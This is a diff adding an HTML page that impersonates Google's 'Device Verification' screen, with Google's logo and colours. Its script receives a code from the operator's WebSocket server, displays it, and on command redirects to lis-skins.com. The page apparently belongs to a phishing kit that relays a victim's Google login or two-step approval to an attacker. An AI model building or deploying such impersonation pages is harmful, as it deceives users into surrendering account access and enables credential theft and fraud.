@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Device - Google</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #202124;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 75px;
+            height: 24px;
+        }
+        .title {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 40px;
+        }
+        .loading {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f1f1f1;
+            border-radius: 50%;
+            border-top: 5px solid #1a73e8;
+            animation: spin 1s linear infinite;
+            margin: 20px 0;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .verification-code {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 30px 0;
+            color: #1a73e8;
+            display: none;
+        }
+        .status {
+            margin-top: 20px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <h1 class="title">Device Verification</h1>
+        <p class="subtitle">Waiting for verification from your other device</p>
+        
+        <div id="loading" class="loading"></div>
+        <div id="codeDisplay" class="verification-code"></div>
+        <div id="status" class="status">Waiting for code...</div>
+    </div>
+
+    <script>
+        // Automatically use the same host/port as the page was loaded from
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+        const wsUrl = wsProtocol + window.location.host;
+        const socket = new WebSocket(wsUrl);
+      
+        socket.onopen = () => {
+          socket.send(JSON.stringify({ type: 'register_pageA' }));
+          console.log("Connected to WebSocket server");
+        };
+      
+        socket.onmessage = (event) => {
+          const data = JSON.parse(event.data);
+          if (data.type === 'show_code') {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('codeDisplay').textContent = data.code;
+            document.getElementById('codeDisplay').style.display = 'block';
+          }
+          if (data.type === 'redirect') {
+            window.location.href = "https://lis-skins.com/ru/"; // Relative path to your success page
+          }
+        };
+      </script>
+</body>
+</html>
